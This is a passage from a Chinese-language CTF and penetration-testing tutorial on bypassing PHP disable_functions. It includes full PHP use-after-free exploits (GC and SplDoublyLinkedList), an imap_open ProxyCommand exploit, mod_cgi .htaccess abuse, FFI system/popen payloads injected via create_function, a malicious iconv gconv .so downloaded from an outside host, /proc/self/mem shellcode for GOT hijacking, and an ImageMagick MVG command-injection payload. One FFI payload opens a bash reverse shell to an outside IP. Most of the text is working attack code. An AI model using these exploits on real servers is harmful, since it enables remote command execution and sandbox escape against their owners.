            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);
    exit();
}
```



### 利用方法

利用方法和GC UAF绕过disable_functions相同。下载利用脚本后先对脚本像上面那样进行修改，然后将修改后的利用脚本上传到目标主机上，如果是web目录则直接传参执行命令，如果是其他有权限的目录，则将脚本包含进来再传参执行命令。

## 利用 Apache Mod CGI

### 使用条件：

> Linux 操作系统
>
> Apache + PHP (apache 使用 apache_mod_php)
>
> Apache 开启了`cgi`、`rewrite`
>
> Web 目录给了`AllowOverride`权限
>
> 当前目录可写

### 原理简述

早期的Web服务器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。简单理解，可以认为CGI是Web服务器和运行在其上的应用程序进行“交流”的一种约定。

当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。

而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。 也就是说将这些解释器做成模块的方式，Web服务器会在启动的时候就启动这些解释器。 当有新的动态请求进来时，Web服务器就是自己解析这些动态脚本，省得重新Fork一个进程，效率提高了。

任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。

Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下：

```
Options +ExecCGI
AddHandler cgi-script .xxx
```

这样便会将当前目录下的所有的.xxx文件当做CGI程序执行了。

由于CGI程序可以执行命令，那我们可以利用CGI来执行系统命令绕过disable_functions。

###  演示过程

还是利用 [AntSword-Labs](https://github.com/AntSwordProject/AntSword-Labs)项目来搭建环境

并且发现目标主机Apache开启了CGI，Web目录下有写入的权限。

我们首先在当前目录创建 .htaccess 文件，写入如下：

```
Options +ExecCGI
AddHandler cgi-script .ant
```

然后新建 shell.ant 文件，写入要执行的命令：

```
#!/bin/sh
echo Content-type: text/html
echo ""
echo&&id
```

这个文件需要在linux环境下编写

上传到`/var/www/html`下

![image-20210210110320568](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271152389.jpeg)

此时我们的shell.xxx还不能执行，因为还没有权限，我们使用php的chmod()函数给其添加可执行权限

```
?ant=chmod('shell.ant',0777)
```

最后访问shell.ant文件便可成功执行命令

![image-20210210110924903](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271156154.jpeg)



点击开始按钮后，成功之后会创建一个新的虚拟终端，在这个新的虚拟终端中即可执行命令了。

###  2020De1CTF

https://www.anquanke.com/post/id/204345

文件上传：利用content_type绕过后缀名，php改了也不行

.htaccess绕过：

上传.htaccess,将所有文件都按照php文件来执行

一句话木马，短标签绕过。

## 通过攻击 PHP-FPM

看我这两篇文章

### 理论：

https://blog.csdn.net/unexpectedthing/article/details/123168001

### ctf题目：

https://blog.csdn.net/unexpectedthing/article/details/123137693

## 利用 imap_open() 绕过 

安装 PHP 的 imap 扩展：`apt-get install php-imap`；

在 php.ini 中开启 `imap.enable_insecure_rsh `选项为 On；重启服务。

成功配置好环境后，在 phpinfo 中会看到如下信息：

![img](https://www.scuctf.com/ctfwiki/web/3.rce/pic/4.png)

### 基本原理 

PHP 的 imap_open 函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的 imap_open 函数在将邮箱名称传递给 rsh 或 ssh 命令之前不正确地过滤邮箱名称。如果启用了 rsh 和 ssh 功能并且 rsh 命令是 ssh 命令的符号链接，则攻击者可以通过向目标系统发送包含 - oProxyCommand 参数的恶意 IMAP 服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的 exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意 shell 命令。利用此漏洞的功能代码是 Metasploit Framework 的一部分。

exp 如下，先判断是否存在 imap_open() 函数，然后构造 exp 执行通过外部 GET 输入的命令然后保存结果到本地文件中，最后输出结果文件内容，注意 sleep(5) 是为了等 imap_open() 函数执行完、因为该函数执行时需要 DNS 轮询会存在延时：

```php
<?php
error_reporting(0);
if (!function_exists('imap_open')) {
        die("no imap_open function!");
}
$server = "x -oProxyCommand=echo\t" . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . "|base64\t-d|sh}";
//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . '|base64$IFS$()-d|sh}';
imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or var_dump("\n\nError: ".imap_last_error());
sleep(5);
echo file_get_contents("/tmp/cmd_result");
?>
```

当然，替换空格符的 \ t 也可以换成`$IFS$()`来 Bypass 掉。

![img](https://www.scuctf.com/ctfwiki/web/3.rce/pic/3.png)

##  利用 SplDoublyLinkedList

### 使用条件：

PHP 版本

> PHP v7.4.10及其之前版本
>
> PHP v8.0（Alpha）

###  原理

PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等

参考：https://xz.aliyun.com/t/8355#toc-1

###  演示过程

[第一届BMZCTF公开赛]easy php

```php
 <?php 
highlight_file(__FILE__);
$cmd=$_POST['a'];
if(strlen($cmd) > 25){
    die();
}else{
    eval($cmd);
} 

```

看phpinfo

![image-20220327134927521](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271349711.png)

过滤了

```
pcntl_alarm
pcntl_fork
pcntl_waitpid
pcntl_wait
pcntl_wifexited
pcntl_wifstopped
pcntl_wifsignaled
pcntl_wifcontinued
pcntl_wexitstatus
pcntl_wtermsig
pcntl_wstopsig
pcntl_signal
pcntl_signal_get_handler
pcntl_signal_dispatch
pcntl_get_last_error
pcntl_strerror
pcntl_sigprocmask
pcntl_sigwaitinfo
pcntl_sigtimedwait
pcntl_exec
pcntl_getpriority
pcntl_setpriority
pcntl_async_signals
system
exec
shell_exec
popen
proc_open
passthru
symlink
link
syslog
imap_open
ld
dl
mail
gc_collect_cycles
getenv
unserialize
putenv
serialize
Imagick��
```

直接上线蚁剑

![image-20220327135355016](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271353222.png)

因为`putenv`被过滤了，所以`LD_PRELOAD & putenv()`的`bypass disable function`的方法不行

exp.php

```php
<?php
error_reporting(0);
$a = str_repeat("T", 120 * 1024 * 1024);
function i2s(&$a, $p, $i, $x = 8) {
    for($j = 0;$j < $x;$j++) {
        $a[$p + $j] = chr($i & 0xff);
        $i >>= 8;
    }
}

function s2i($s) {
    $result = 0;
    for ($x = 0;$x < strlen($s);$x++) {
        $result <<= 8;
        $result |= ord($s[$x]);
    }
    return $result;
}

function leak(&$a, $address) {
    global $s;
    i2s($a, 0x00, $address - 0x10);
    return strlen($s -> current());
}

function getPHPChunk($maps) {
    $pattern = '/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /';
    preg_match_all($pattern, $maps, $match);
    foreach ($match[1] as $value) {
        list($start, $end) = explode("-", $value);
        if (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) >= 0x200000 && $length <= 0x300000) {
            $address = array(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);
            echo "[+]PHP Chunk: " . $start . " - " . $end . ", length: 0x" . dechex($length) . "\n";
            return $address;
        }
    }
}

function bomb1(&$a) {
    if (leak($a, s2i($_GET["test1"])) === 0x5454545454545454) {
        return (s2i($_GET["test1"]) & 0x7ffff0000000);
    }else {
        die("[!]Where is here");
    }
}

function bomb2(&$a) {
    $start = s2i($_GET["test2"]);
    return getElement($a, array($start, $start + 0x200000, 0x200000));
    die("[!]Not Found");
}

function getElement(&$a, $address) {
    for ($x = 0;$x < ($address[2] / 0x1000 - 2);$x++) {
        $addr = 0x108 + $address[0] + 0x1000 * $x + 0x1000;
        for ($y = 0;$y < 5;$y++) {
            if (leak($a, $addr + $y * 0x08) === 0x1234567812345678 && ((leak($a, $addr + $y * 0x08 - 0x08) & 0xffffffff) === 0x01)){
                echo "[+]SplDoublyLinkedList Element: " . dechex($addr + $y * 0x08 - 0x18) . "\n";
                return $addr + $y * 0x08 - 0x18;
            }
        }
    }
}

function getClosureChunk(&$a, $address) {
    do {
        $address = leak($a, $address);
    }while(leak($a, $address) !== 0x00);
    echo "[+]Closure Chunk: " . dechex($address) . "\n";
    return $address;
}

function getSystem(&$a, $address) {
    $start = $address & 0xffffffffffff0000;
    $lowestAddr = ($address & 0x0000fffffff00000) - 0x0000000001000000;
    for($i = 0; $i < 0x1000 * 0x80; $i++) {
        $addr = $start - $i * 0x20;
        if ($addr < $lowestAddr) {
            break;
        }
        $nameAddr = leak($a, $addr);
        if ($nameAddr > $address || $nameAddr < $lowestAddr) {
            continue;
        }
        $name = dechex(leak($a, $nameAddr));
        $name = str_pad($name, 16, "0", STR_PAD_LEFT);
        $name = strrev(hex2bin($name));
        $name = explode("\x00", $name)[0];
        if($name === "system") {
            return leak($a, $addr + 0x08);
        }
    }
}

class Trigger {
    function __destruct() {
        global $s;
        unset($s[0]);
        $a = str_shuffle(str_repeat("T", 0xf));
        i2s($a, 0x00, 0x1234567812345678);
        i2s($a, 0x08, 0x04, 7);
        $s -> current();
        $s -> next();
        if ($s -> current() !== 0x1234567812345678) {
             die("[!]UAF Failed");
        }
        $maps = file_get_contents("/proc/self/maps");
        if (!$maps) {
            cantRead($a);
        }else {
            canRead($maps, $a);
        }
        echo "[+]Done";
    }
}

function bypass($elementAddress, &$a) {
    global $s;
    if (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) {
        die("[!]Get Closure Chunk Address Failed");
    }
    $closure_object = leak($a, $closureChunkAddress + 0x18);
    echo "[+]Closure Object: " . dechex($closure_object) . "\n";
    $closure_handlers = leak($a, $closure_object + 0x18);
    echo "[+]Closure Handler: " . dechex($closure_handlers) . "\n";
    if(!($system_address = getSystem($a, $closure_handlers))) {
        die("[!]Couldn't determine system address");
    }
    echo "[+]Find system's handler: " . dechex($system_address) . "\n";
    i2s($a, 0x08, 0x506, 7);
    for ($i = 0;$i < (0x130 / 0x08);$i++) {
        $data = leak($a, $closure_object + 0x08 * $i);
        i2s($a, 0x00, $closure_object + 0x30);
        i2s($s -> current(), 0x08 * $i + 0x100, $data);
    }
    i2s($a, 0x00, $closure_object + 0x30);
    i2s($s -> current(), 0x20, $system_address);
    i2s($a, 0x00, $closure_object);
    i2s($a, 0x08, 0x108, 7);
    echo "[+]Executing command: \n";
    ($s -> current())("php -v");
}

function canRead($maps, &$a) {
    global $s;
    if (!$chunkAddress = getPHPChunk($maps)) {
        die("[!]Get PHP Chunk Address Failed");
    }
    i2s($a, 0x08, 0x06, 7);
    if (!$elementAddress = getElement($a, $chunkAddress)) {
        die("[!]Get SplDoublyLinkedList Element Address Failed");
    }
    bypass($elementAddress, $a);
}

function cantRead(&$a) {
    global $s;
    i2s($a, 0x08, 0x06, 7);
    if (!isset($_GET["test1"]) && !isset($_GET["test2"])) {
        die("[!]Please try to get address of PHP Chunk");
    }
    if (isset($_GET["test1"])) {
        die(dechex(bomb1($a)));
    }
    if (isset($_GET["test2"])) {
        $elementAddress = bomb2($a);
    }
    if (!$elementAddress) {
        die("[!]Get SplDoublyLinkedList Element Address Failed");
    }
    bypass($elementAddress, $a);
}

$s = new SplDoublyLinkedList();
$s -> push(new Trigger());
$s -> push("Twings");
$s -> push(function($x){});
for ($x = 0;$x < 0x100;$x++) {
    $s -> push(0x1234567812345678);
}
$s -> rewind();
unset($s[0]);

```

我们利用`SplDoubleyLinkedList`来绕过df

上传文件到`/tmp`

然后包含文件`include('/tmp/exp.php')`

可以看到已经执行了`php -v`

![image-20220327135659671](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271356887.png)

执行`/readflag`

![image-20220327135723512](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271357711.png)

##  利用 FFI 扩展执行命令

### 使用条件：

> Linux 操作系统
>
> PHP >= 7.4
>
> 开启了 FFI 扩展且`ffi.enable=true﻿`

### 原理简述

PHP 7.4 的 FFI（Foreign Function Interface），即外部函数接口，允许从用户在PHP代码中去调用C代码。

FFI的使用非常简单，只用声明和调用两步就可以。

首先我们使用`FFI::cdef()`函数在PHP中声明一个我们要调用的这个C库中的函数以及使用到的数据类型，类似如下：

```
$ffi = FFI::cdef("int system(char* command);");   # 声明C语言中的system函数
```

这将返回一个新创建的FFI对象，然后使用以下方法即可调用这个对象中所声明的函数：

```
$ffi ->system("ls / > /tmp/res.txt");   # 执行ls /命令并将结果写入/tmp/res.txt
```

由于system函数执行命令无回显，所以需要将执行结果写入到tmp等有权限的目录中，最后再使用`echo file_get_contents("/tmp/res.txt");`查看执行结果即可。

可见，当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数或其他能实现我们需求的函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。

###  演示过程

[极客大挑战FighterFightsInvincibl]

![image-20220327195031035](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271950175.png)

看到三个变量我们都可以控制，可以动态执行php命令，`create_function`代码注入

```
create_function(string $args,string $code)
//string $args 声明的函数变量部分
//string $code 执行的方法代码部分
```

我们令`fighter=create_function`，`invincibly=;}eval($_POST[whoami]);/*`即可注入恶意代码并执行。

payload：

```php
/?fighter=create_function&fights=&invincibly=;}eval($_POST[whoami]);//
```

![image-20220327195523120](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271955273.png)

蚁剑连接，但是打不开

open_basedir和disable_function都限制了。

![image-20220327195838512](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271958635.png)

![image-20220327195813154](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271958323.png)



根据题目名字的描述，应该是让我们使用PHP 7.4 的FFI绕过disabled_function

而且FFI扩展开着的

![image-20220327200001730](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203272000858.png)



**（一）利用FFI调用C库的system函数**

我们首先尝试调用C库的system函数：

```php
/?fighter=create_function&fights=&invincibly=;}$ffi = FFI::cdef("int system(const char *command);");$ffi->system("ls / > /tmp/z3eyond.txt");echo file_get_contents("/tmp/z3eyond.txt");/*
```

C库的system函数执行是没有回显的，所以需要将执行结果写入到tmp等有权限的目录中，最后再使用`echo file_get_contents("/tmp/res.txt");`查看执行结果即可。

但是这道题执行后却发现有任何结果，可能是我们没有写文件的权限。尝试反弹shell：

```php
/?fighter=create_function&fights=&invincibly=;}$ffi = FFI::cdef("int system(const char *command);");$ffi->system('bash -c "bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1"')/*
```

但这里也失败了，可能还是权限的问题。所以，我们还要找别的C库函数。

**（二）利用FFI调用C库的popen函数**

C库的system函数调用shell命令，只能获取到shell命令的返回值，而不能获取shell命令的输出结果，如果想获取输出结果我们可以用popen函数来实现：

```c
FILE *popen(const char* command, const char* type);
```

popen()函数会调用fork()产生子进程，然后从子进程中调用 /bin/sh -c 来执行参数 command 的指令。

参数 type 可使用 "r"代表读取，"w"代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。

所以，我们还可以利用C库的popen()函数来执行命令，但要读取到结果还需要C库的fgetc等函数。payload如下：

```php
/?fighter=create_function&fights=&invincibly=;}$ffi = FFI::cdef("void *popen(char*,char*);void pclose(void*);int fgetc(void*);","libc.so.6");$o = $ffi->popen("ls /","r");$d = "";while(($c = $ffi->fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,"0",0);}$ffi->pclose($o);echo hex2bin($d);/* 
```

成功执行命令：

![image-20220327200249481](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203272002643.png)



**（三）利用FFI调用PHP源码中的函数**

其次，我们还有一种思路，即FFI中可以直接调用php源码中的函数，比如这个php_exec()函数就是php源码中的一个函数，当他参数type为3时对应着调用的是passthru()函数，其执行命令可以直接将结果原始输出，payload如下：

```php
/?fighter=create_function&fights=&invincibly=;}$ffi = FFI::cdef("int php_exec(int type, char *cmd);");$ffi->php_exec(3,"ls /");/*
```

成功执行

![image-20220327200727927](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203272007084.png)

##  利用iconv来绕过

###  条件

>1.可以写入文件，能命令执行
>
>2.iconv存在

###  原理简述

这里payload能调用到payload.so是因为iconv除了系统提供的gconv模块外，还支持使用GCONV_PATH指定的自定义gconv模块目录下的模块。因此设置GCONV_PATH后，通过我们设置的gconv-modules，就可以在编码转换时如果遇到payload编码，就回去调用payload.so了。调用so文件，就执行命令

###  演示过程

2021SCTF[RCEME]

利用`iconv`去绕过df

参考：https://xz.aliyun.com/t/8669#toc-8

**流程：**

用自己的linux系统

创建payload.c

```c
#include <stdio.h>
#include <stdlib.h>

void gconv() {}

void gconv_init() {
  puts("pwned");
  system("bash -c '/readflag > /tmp/sna'");
  exit(0);
}

```

生成so文件（这儿介绍哈so文件）

```c
gcc payload.c -o payload.so -shared -fPIC 
```

再创建一个gconv-modules文件

```
module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2
module  INTERNAL    PAYLOAD//    ../../../../../../../../tmp/payload    2
```

把这两个文件放到服务器上，记得打开端口，然后创建一个网站，能直接访问到网站的目录。

![image-20220326221929952](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271910593.png)

然后利用 `SplFileObject` 写 **payload.so** 和 **gconv-modules**

一定等响应包状态为200，才是写进去文件了

```php
a=$url="http://xx.xx.171.248:10000/payload.so";$file1=new SplFileObject($url,'r');$a="";while(!$file1->eof()){$a=$a.$file1->fgets();}$file2 = new SplFileObject('/tmp/payload.so','w');$file2->fwrite($a);

```

```php
a=$url = "http://xx.xx.171.248:39543/gconv-modules";$file1 = new SplFileObject($url,'r');$a="";while(!$file1->eof()){$a=$a.$file1->fgets();}$file2 = new SplFileObject('/tmp/gconv-modules','w');$file2->fwrite($a);

```

利用伪协议触发

```php
a=putenv("GCONV_PATH=/tmp/");show_source("php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so");
```

进行读取

```php
a=show_source("/tmp/sna");
```

![image-20220326222152682](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271910981.png)

拿到flag。



## 向/proc/self/mem写shellcode劫持got表

参考之前对[宝塔rsap绕过的文章](https://xz.aliyun.com/t/7990)，直接往/proc/self/mem写shellcode劫持got表，看起来也是可以的。

测试用php-cli也确实是可以覆盖的，exp如下：

```
<?php
    function get_p64($magic){
       $tmp="";
       for($i=0;$i<8;$i++){
       $n_tmp=($magic>>($i*8))&0xff;
       $tmp.=chr($n_tmp); 
      }
      return $tmp;
    }
    $leak_file = fopen('/proc/self/maps', 'r');
    $base_str = fread($leak_file,12);
    $pie_base= hexdec($base_str);
    echo $pie_base;
    $mem = fopen('/proc/self/mem', 'wb');

    $shell = $pie_base + 0x0E6800; 
    fseek($mem, $shell);
    $a="jgH\xb8/readflaPH\x89\xe71\xd21\xf6j;X\x0f\x05";
    fwrite($mem,  $a);
    fseek($mem,$pie_base+0x0068FE68);
    fwrite($mem,get_p64($shell));
    readfile("123","r");
?>
```

然而测试apache的时候，发现没有权限。虽然/proc/self/mem是www-data的，权限也是600，但是php就是没权限获得句柄。。。
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203272020167.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20201215165407-175276a0-3eb3-1.jpg)

后来研究发现，apache是root运行的父进程，然后 setuid将子进程降权为www-data，/proc/self/目录属于root用户，因此子进程无权限读写。如果是nginx+php，对于低版本的php-fpm，www-data权限的子进程，/proc/self/目录属于www用户可以读写，[tsrc这篇文章](https://security.tencent.com/index.php/blog/msg/166)测试结果是php\<5.6版本是可以使用GOT表劫持。

写一下劫持GOT表的步骤，这里直接写shellcode：

1. 读/proc/self/maps找到php和libc在内存中的基址
2. 解析/proc/self/exe找到php文件中readfile@got的偏移
3. 找个能写的地址写shellcode
4. 向readfile@got写shellcode地址覆盖
5. 调用readfile

##  利用ImagMagick

**使用条件：**

> 目标主机安装了漏洞版本的imagemagick（<= 3.3.0）
>
> 安装了php-imagick拓展并在php.ini中启用；
>
> 编写php通过new Imagick对象的方式来处理图片等格式文件；
>
> PHP >= 5.4

### 原理简述

imagemagick是一个用于处理图片的程序，它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。

利用ImageMagick绕过disable_functions的方法利用的是ImageMagick的一个漏洞（CVE-2016-3714）。漏洞的利用过程非常简单，只要将精心构造的图片上传至使用漏洞版本的ImageMagick，ImageMagick会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。因此很多具有头像上传、图片转换、图片编辑等具备图片上传功能的网站都可能会中招。所以如果在phpinfo中看到有这个ImageMagick，可以尝试一下。

###  演示过程

我们使用网上已有的docker镜像来搭建环境：

```
docker pull medicean/vulapps:i_imagemagick_1
docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1
```

启动环境后，访问 [http://your-ip:8000](http://your-ip:8000/)端口：

![image-20220327213024068](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203272130215.png)

此时目标主机仍然设置了disable_functions只是我们无法执行命令，并且查看phpinfo发现其安装并开启了ImageMagick拓展

此时我们便可以通过攻击ImageMagick绕过disable_functions来执行命令。

将一下利用脚本上传到目标主机上有权限的目录（/var/tmp/exploit.php）：

```php
<?php
echo "Disable Functions: " . ini_get('disable_functions') . "\n";

$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
   $command = 'id';
}

$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'
pop graphic-context
EOF;

file_put_contents("KKKK.mvg", $exploit);
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
?>
```

## 使用蚁剑插件并修改绕过

![image-20220327201734671](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203272017812.png)



##  参考文章

https://www.scuctf.com/ctfwiki/web/3.rce/%E7%BB%95%E8%BF%87disable_functions/#php-fpm-disable_functions

https://www.freebuf.com/articles/network/263540.html
